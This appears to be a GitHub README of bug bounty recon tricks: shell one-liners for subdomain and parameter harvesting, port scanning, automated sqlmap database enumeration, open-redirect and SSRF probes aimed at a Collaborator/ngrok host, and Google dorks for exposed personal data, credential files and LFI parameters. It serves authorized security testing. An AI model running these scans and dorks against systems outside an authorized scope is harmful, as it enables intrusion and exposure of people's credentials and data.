# 「🐞」Bug Bounty Tricks

<img src="https://insights.dice.com/wp-content/uploads/2019/07/Bug-Bounty-Program-Dice.png" weight=100 height=300>

Welcome to my repository! I'll leave here all the tricks I developed throughout my career as a Bug Hunter, I hope to help you.

# Unix Terminal:

### Extract subdomains and check if it's active

```
sublist3r -d scope.com -o extracted_subdomains.txt;cat extracted_subdomains.txt | httpx -silent -o verified_subdomains.txt;cat verified_subdomains.txt | awk -F[/:] '{print $4}' | anew > subdomains.txt;rm verified_subdomains.txt extracted_subdomains.txt
```

### Extract subdomains (manually)

```
for scope in $(cat domains.txt);do curl "https://web.archive.org/cdx/search/cdx?url=*.$scope/*&output=text&fl=original&collapse=urlkey" | awk -F[/:] '{print $4}' | anew | sed -e 's/:80//' | httpx -silent | awk -F[/:] '{print $4}' | tee -a subdomains.txt;done
```

### Extract IPs from a list of subdomains

```
for scope in $(cat subdomains.txt);do dig +short $scope | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | anew | tee -a ips.txt;done
```

### Extract parameters from a list of subdomains

```
for scope in $(cat subdomains.txt);do paramspider -d $scope;done;cat output/* > parameters.txt;rm -r output

cat subdomains.txt | waybackurls | sed -e 's/:80//' | grep "?[a-z0-9]*="
```

### Extract parameters from a list of subdomains (manually)

```
for scope in $(cat domains.txt);do curl "https://web.archive.org/cdx/search/cdx?url=*.$scope/*&output=text&fl=original&collapse=urlkey" | grep "?[a-z0-9]*=" | sed -e 's/:80//' | tee -a parameters.txt;done
```

### Scan ports on a host quickly

```
SCOPE=192.168.0.0/24;RPORT=22,80,443;rustscan -b 500 -a $SCOPE -p $RPORT | grep "Open $SCOPE[0-9]*" | tee -a ports_scanned.txt
```

### Extract JS files with GetJS

```
cat subdomains.txt | getJS --complete | anew | tee -a js.txt
```

### Extract JS files

```
for scope in $(cat subdomains.txt);do curl "https://web.archive.org/cdx/search/cdx?url=$scope/*&output=text&fl=original&collapse=urlkey" | grep "\\.js" | sed -e 's/:80//' | tee -a js.txt;done
```

### Extract json files

```
cat subdomains.txt | waybackurls | grep "\\.json" | anew | tee -a json.txt
```

### Extract subdomains and capture the screen

```
assetfinder -subs-only scope.com | httpx -silent -o verified_subdomains.txt;cat verified_subdomains.txt | awk -F[/:] '{print $4}' | anew > subdomains.txt;rm verified_subdomains.txt;eyewitness -f subdomains.txt --prepend-https -d screenshots
```

### Extract subdomains and comments in source code

```
assetfinder -subs-only scope.com | httpx -silent | html-tool comments
```

### Extract subdomains and open redirect parameters

```
assetfinder -subs-only scope.com | waybackurls | gf redirect | xargs -I@ sh -c 'oralyzer -u @'
```

### Extract all subdomains with CMS WordPress

```
echo scope.com | assetfinder -subs-only | waybackurls | grep 'wp-content' | httpx -silent | awk -F[/:] '{print $4}' | anew
```

### Verify SQL Injection

```
for scope in $(cat domains.txt);do curl "https://web.archive.org/cdx/search/cdx?url=*.$scope/*&output=text&fl=original&collapse=urlkey" | grep "?[a-z0-9]*=" | sed -e 's/:80//' | gf sqli | sqlmap --risk 3 --batch --dbs;done
```

### Easy Open Redirect by endpoint injection

```
for x in $(cat domains.txt | assetfinder -subs-only | httpx -silent);do echo "$x//<BURP SUITE COLLABORATOR OR NGROK>/%2F.." | httpx -silent -follow-redirects;done
```

### Automatic SSRF

```
cat subdomains.txt | waybackurls | gf ssrf | qsreplace <http://BURP SUITE COLLABORATOR OR NGROK> | httpx -silent -follow-redirects
```

# Google Dorks:

### Confidential files

```
site:*.scope.com ext:pdf intext:"name" intext:"email" intext:"phone" intext:"address"
site:*.scope.com ext:pdf intext:"name" intext:"email" intext:"<@domain.com>" intext:"phone" intext:"address"
site:*.scope.com ext:pdf intext:"name" intext:"email" intext:"phone" intext:"city" intext:"state" intext:"zipcode"
```

### Files containing credentials

```
site:*.scope.com ext:sql
site:*.scope.com ext:env
site:*.scope.com ext:txt
site:*.scope.com ext:sql intext:"Dumping data for table `users`" | `password` | `name`
site:*.scope.com ext:txt intext:"<@domain.com>" intext:email intext:password
```

### Open Redirect

* <a href="https://www.openbugbounty.org/blog/devl00p/top-100-open-redirect-dorks/">More</a>
```
site:*.scope.com inurl:?RedirectUrl=
site:*.scope.com inurl:?page=
site:*.scope.com inurl:?url=
site:*.scope.com inurl:?uri=
site:*.scope.com inurl:?u=
site:*.scope.com inurl:?return=
site:*.scope.com inurl:?redirectBack=
site:*.scope.com inurl:?redir=
site:*.scope.com inurl:?returnurl=
site:*.scope.com inurl:?return_url=
site:*.scope.com inurl:?link=
site:*.scope.com inurl:?location=
site:*.scope.com inurl:?referrer=
site:*.scope.com inurl:?back=
site:*.scope.com inurl:?home=
site:*.scope.com inurl:?return_to=
site:*.scope.com inurl:?startUrl=
```

### (LFI) Local File Inclusion & (RFI) Remote File Inclusion

* <a href="https://github.com/Hood3dRob1n/BinGoo/blob/master/dorks/LFI-dork.lst">More</a>
```
site:*.scope.com inurl:?file=
site:*.scope.com inurl:download.php?file=
site:*.scope.com inurl:cat.php?file=
site:*.scope.com inurl:?cat=
site:*.scope.com inurl:read.php?file=
site:*.scope.com inurl:index.php?include=
site:*.scope.com inurl:index.php?file=
site:*.scope.com inurl:index.php?inc=
site:*.scope.com inurl:index.php?open=
site:*.scope.com inurl:index.php?content=
site:*.scope.com inurl:index.php?configFile=
site:*.scope.com inurl:index.php?page=
site:*.scope.com inurl:index.php?template=
site:*.scope.com inurl:index.php?archive=
```

### Sites with CMS WordPress

```
site:*.scope.com inurl:wp-content
site:*.scope.com inurl:wp-content/uploads/<YEAR>/<MONTH>
site:*.scope.com inurl:wp-includes
site:*.scope.com intitle:"Author at"
site:*.scope.com intitle:WordPress intitle:ReadMe ext:html
```
